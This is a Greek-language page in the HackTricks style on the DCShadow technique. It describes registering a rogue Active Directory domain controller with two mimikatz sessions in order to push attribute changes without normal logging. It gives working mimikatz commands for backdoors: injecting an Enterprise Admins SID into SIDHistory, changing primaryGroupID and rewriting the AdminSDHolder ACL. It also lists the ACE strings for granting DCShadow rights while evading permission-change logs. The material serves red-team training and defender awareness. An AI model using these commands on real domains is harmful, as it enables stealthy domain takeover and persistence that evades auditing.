{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Καταχωρεί έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **σπρώξει χαρακτηριστικά** (SIDHistory, SPNs...) σε καθορισμένα αντικείμενα **χωρίς** να αφήνει κανένα **καταγραφή** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα DA και να είστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημες καταγραφές.

Για να εκτελέσετε την επίθεση χρειάζεστε 2 instances του mimikatz. Ένα από αυτά θα ξεκινήσει τους RPC servers με δικαιώματα SYSTEM (πρέπει να υποδείξετε εδώ τις αλλαγές που θέλετε να εκτελέσετε), και η άλλη instance θα χρησιμοποιηθεί για να σπρώξει τις τιμές:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Σημειώστε ότι **`elevate::token`** δεν θα λειτουργήσει σε `mimikatz1` συνεδρία καθώς αυτό αύξησε τα δικαιώματα του νήματος, αλλά πρέπει να αυξήσουμε το **δικαίωμα της διαδικασίας**.\
Μπορείτε επίσης να επιλέξετε και ένα αντικείμενο "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Μπορείτε να σπρώξετε τις αλλαγές από έναν DA ή από έναν χρήστη με αυτές τις ελάχιστες άδειες:

- Στο **αντικείμενο τομέα**:
- _DS-Install-Replica_ (Προσθήκη/Αφαίρεση Αντιγράφου στο Τομέα)
- _DS-Replication-Manage-Topology_ (Διαχείριση Τοπολογίας Αναπαραγωγής)
- _DS-Replication-Synchronize_ (Συγχρονισμός Αναπαραγωγής)
- Το **αντικείμενο Τοποθεσιών** (και τα παιδιά του) στο **δοχείο Διαμόρφωσης**:
- _CreateChild and DeleteChild_
- Το αντικείμενο του **υπολογιστή που είναι καταχωρημένος ως DC**:
- _WriteProperty_ (Όχι Γράψιμο)
- Το **στόχο αντικείμενο**:
- _WriteProperty_ (Όχι Γράψιμο)

Μπορείτε να χρησιμοποιήσετε [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) για να δώσετε αυτά τα δικαιώματα σε έναν χρήστη χωρίς δικαιώματα (σημειώστε ότι αυτό θα αφήσει κάποια αρχεία καταγραφής). Αυτό είναι πολύ πιο περιοριστικό από το να έχετε δικαιώματα DA.\
Για παράδειγμα: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Αυτό σημαίνει ότι το όνομα χρήστη _**student1**_ όταν συνδεθεί στη μηχανή _**mcorp-student1**_ έχει άδειες DCShadow πάνω στο αντικείμενο _**root1user**_.

## Χρήση του DCShadow για τη δημιουργία πισωπόρτων
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Δώστε δικαιώματα DCShadow χρησιμοποιώντας DCShadow (χωρίς τροποποιημένα αρχεία καταγραφής δικαιωμάτων)

Πρέπει να προσθέσουμε τα παρακάτω ACEs με το SID του χρήστη μας στο τέλος:

- Στο αντικείμενο τομέα:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Στο αντικείμενο υπολογιστή του επιτιθέμενου: `(A;;WP;;;UserSID)`
- Στο αντικείμενο του στόχου χρήστη: `(A;;WP;;;UserSID)`
- Στο αντικείμενο Sites στο κοντέινερ Configuration: `(A;CI;CCDC;;;UserSID)`

Για να αποκτήσετε το τρέχον ACE ενός αντικειμένου: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Σημειώστε ότι σε αυτή την περίπτωση πρέπει να κάνετε **πολλές αλλαγές,** όχι μόνο μία. Έτσι, στη **συνεδρία mimikatz1** (RPC server) χρησιμοποιήστε την παράμετρο **`/stack` με κάθε αλλαγή** που θέλετε να κάνετε. Με αυτόν τον τρόπο, θα χρειαστεί να **`/push`** μόνο μία φορά για να εκτελέσετε όλες τις σωρευμένες αλλαγές στον ρουγέ server.

[**Περισσότερες πληροφορίες σχετικά με το DCShadow στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
